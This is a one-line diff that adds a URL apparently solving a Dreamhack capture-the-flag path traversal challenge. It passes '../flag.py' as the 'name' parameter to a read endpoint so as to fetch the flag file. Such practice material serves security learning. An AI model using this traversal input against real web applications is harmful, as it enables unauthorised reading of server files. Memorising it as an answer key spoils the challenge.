@@ -1,0 +1,1 @@
+http://host1.dreamhack.games:PORT_NUMBER/read?name=../flag.py
